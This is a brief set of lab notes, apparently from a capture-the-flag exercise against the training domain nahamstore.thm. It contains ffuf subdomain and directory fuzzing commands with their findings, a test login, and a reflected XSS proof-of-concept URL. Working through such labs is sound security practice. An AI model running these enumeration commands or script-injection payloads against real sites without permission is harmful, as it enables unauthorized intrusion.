___
test@test.com:testtest
# Recon

```bash
ffuf -w subdomains.txt -u http://nahamstore.thm -H "Host: FUZZ.nahamstore.thm"
```

- marketing
- shop
- stock
- www

```bash
ffuf -w content.txt -u http://nahamstore.thm/FUZZ
```

- basket
- css
- js
- login
- logout
- register
- returs
- robots.txt
- seach
- staff
- uploads

# XSS

```
http://marketing.nahamstore.thm/?error=%3Cscript%3Ealert(1)%3C/script%3E
```

